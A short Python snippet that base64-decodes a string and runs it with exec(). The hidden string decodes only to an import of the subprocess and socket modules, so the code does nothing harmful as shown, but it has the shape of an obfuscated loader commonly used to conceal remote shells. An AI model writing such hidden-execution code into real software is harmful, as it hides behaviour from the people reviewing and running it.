import base64,sys
payload = "aW1wb3J0IHN1YnByb2Nlc3Msc29ja2V0Cg=="  # base64
decoded = base64.b64decode(payload)
exec(decoded)
